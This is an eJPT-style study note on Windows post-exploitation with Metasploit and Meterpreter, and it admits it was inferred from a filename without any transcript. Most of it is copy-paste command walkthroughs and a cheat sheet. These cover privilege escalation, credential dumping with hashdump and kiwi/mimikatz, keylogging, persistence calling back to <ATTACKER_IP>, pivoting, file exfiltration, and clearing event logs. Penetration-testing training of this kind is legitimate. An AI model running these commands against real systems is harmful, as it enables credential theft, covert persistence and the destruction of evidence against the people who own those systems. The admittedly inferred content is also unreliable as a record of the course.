# 01 - Windows Post Exploitation Modules

Note: The transcript wasn’t provided. The following is a conservative, eJPT-aligned summary inferred from the filename and typical content for “Windows Post Exploitation Modules.” Commands and module names are standard Metasploit/Meterpreter practice.

## What the video covers (Introduction / big picture)
- How to use Metasploit “post” modules on Windows after you’ve gained a Meterpreter session.
- Common categories: privilege escalation helpers, system/user enumeration, credential harvesting, persistence, lateral movement groundwork, basic OPSEC.
- Tying Meterpreter built-ins (getsystem, migrate, keylogger, screenshot) with post/windows modules (gather, manage).
- Practical workflow and where loot gets stored.

## Flow (ordered)
1. Confirm and stabilize your Meterpreter session (arch, migrate, try getsystem).
2. Run a local exploit suggester to identify escalation paths.
3. Enumerate the host: environment/VM, applications, patches, users, shares.
4. Harvest credentials: SAM/LSA secrets, cleartext creds via kiwi/mimikatz, keylogging, screenshots.
5. Establish persistence (optional and only with authorization).
6. Prepare for lateral movement: route/pivot if needed.
7. Collect loot and maintain OPSEC; clean up as required by engagement rules.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Meterpreter (Windows x64/x86)
- Metasploit post modules:
  - post/multi/recon/local_exploit_suggester
  - post/windows/gather/checkvm
  - post/windows/gather/enum_applications
  - post/windows/gather/enum_patches
  - post/windows/gather/enum_shares
  - post/windows/gather/enum_logged_on_users
  - post/windows/gather/smart_hashdump
  - post/windows/manage/enable_rdp
  - post/multi/manage/autoroute
- Meterpreter extensions/commands:
  - load kiwi (Mimikatz)
  - creds_all, kiwi_cmd sekurlsa::logonpasswords
  - getsystem, hashdump, ps, migrate, keyscan_*, screenshot, clearev
- Windows built-ins via shell: whoami /groups, ipconfig, net user, net localgroup, reg query

## Typical command walkthrough (detailed, copy-paste friendly)
Assumptions: you already have a Meterpreter session (ID 1) on a Windows target.

```bash
# 0) Start MSF and confirm session
msfconsole -q
sessions -l

# 1) Interact and stabilize
sessions -i 1
sysinfo
getuid
ps
# Pick a stable 64-bit user process (e.g., explorer.exe) and migrate to it:
# Replace <PID> with a PID from 'ps' output
migrate <PID>
getprivs
getsystem
background

# 2) Suggest local privilege escalation exploits
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
back

# 3) Host/Environment enumeration
use post/windows/gather/checkvm
set SESSION 1
run
back

use post/windows/gather/enum_applications
set SESSION 1
run
back

use post/windows/gather/enum_patches
set SESSION 1
run
back

use post/windows/gather/enum_logged_on_users
set SESSION 1
run
back

use post/windows/gather/enum_shares
set SESSION 1
run
back

# 4) Credential harvesting
sessions -i 1
# If SYSTEM, this may work directly:
hashdump
# If hashdump fails or you want a more robust method:
background
use post/windows/gather/smart_hashdump
set SESSION 1
set GETSYSTEM true
run
back

# Load Kiwi (Mimikatz) for creds in memory (prefer 64-bit, elevated session)
sessions -i 1
load kiwi
# Quick sweep of all supported credential providers
creds_all
# Classic Mimikatz logon passwords (may trigger AV/EDR)
kiwi_cmd sekurlsa::logonpasswords
# Dump SAM and LSA secrets via Kiwi
lsa_dump_sam
lsa_dump_secrets

# Optional: Keylogging and screenshots
keyscan_start
# ... wait while user types ...
keyscan_dump
keyscan_stop
screenshot
background

# 5) Persistence (only with explicit authorization)
use post/windows/manage/enable_rdp
set SESSION 1
run
back

# Legacy meterpreter script persistence example (User-logon persistence):
sessions -i 1
# Replace <ATTACKER_IP> and port
run persistence -U -i 10 -p 4444 -r <ATTACKER_IP>
background

# 6) Pivoting/Routes (if you discover internal subnets)
use post/multi/manage/autoroute
set SESSION 1
# Replace with discovered subnet and mask
set SUBNET 10.10.20.0
set NETMASK 255.255.255.0
run
back
# Optionally start a SOCKS proxy for pivoting:
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# 7) Loot and cleanup
# Download interesting files
sessions -i 1
# Example: search for passwords on Desktop/Documents
search -f *pass*.*
# Example: download file
download "C:\\Users\\Public\\Documents\\important.txt"
# Clear Windows event logs (engagement-permitting)
clearev
background
```

Notes:
- Metasploit loot is typically saved under: ~/.msf4/loot on Kali.
- For kiwi/mimikatz, a 64-bit, elevated session on 64-bit Windows yields the best results.

## Practical tips
- Use architecture-aware Meterpreter: x64 payload on x64 Windows. Migrate into a same-arch process before loading kiwi.
- Try getsystem after migrating; if UAC blocks, use a UAC bypass or local exploit suggested by local_exploit_suggester.
- Many post modules write artifacts/loot; track and label findings as you go for reporting.
- Expect AV/EDR to flag kiwi/mimikatz and persistence. Use in controlled labs or with explicit authorization only.
- If hashdump fails, smart_hashdump with GETSYSTEM=true often helps.
- keyscan_* works best when user is actively typing in the foreground session.
- enable_rdp requires admin rights and may change firewall settings; ensure you know credentials or create a backdoor account ethically and with authorization.
- Loot paths: look for browser passwords, unattended installs, Windows AutoLogon (HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon), config files.

## Minimal cheat sheet (one-screen flow)
```bash
# List sessions, stabilize, escalate
sessions -l
sessions -i 1
sysinfo && getuid && ps
migrate <PID> && getsystem
background

# Recon (post modules)
use post/windows/gather/checkvm; set SESSION 1; run; back
use post/windows/gather/enum_applications; set SESSION 1; run; back
use post/windows/gather/enum_patches; set SESSION 1; run; back
use post/windows/gather/enum_logged_on_users; set SESSION 1; run; back
use post/windows/gather/enum_shares; set SESSION 1; run; back

# Creds
sessions -i 1
hashdump || true
background
use post/windows/gather/smart_hashdump; set SESSION 1; set GETSYSTEM true; run; back
sessions -i 1
load kiwi
creds_all
kiwi_cmd sekurlsa::logonpasswords
lsa_dump_sam
lsa_dump_secrets

# Extras
keyscan_start; # ...wait... ; keyscan_dump; keyscan_stop
screenshot
background

# Persistence (authorized)
use post/windows/manage/enable_rdp; set SESSION 1; run; back
sessions -i 1; run persistence -U -i 10 -p 4444 -r <ATTACKER_IP>; background

# Pivot
use post/multi/manage/autoroute; set SESSION 1; set SUBNET 10.10.20.0; set NETMASK 255.255.255.0; run

# Cleanup
sessions -i 1; clearev; background
```

## Summary
- After initial access, Windows post-exploitation focuses on stabilizing access, enumerating the host, escalating privileges, and harvesting credentials using Meterpreter and Metasploit post modules.
- Core modules to remember: local_exploit_suggester, checkvm, enum_applications, enum_patches, enum_logged_on_users, enum_shares, smart_hashdump, enable_rdp, autoroute.
- Combine Meterpreter built-ins (migrate, getsystem, load kiwi, keyscan, screenshot, hashdump) with post modules for a thorough workflow.
- Be architecture-aware, maintain OPSEC, and only apply persistence or destructive actions when explicitly authorized.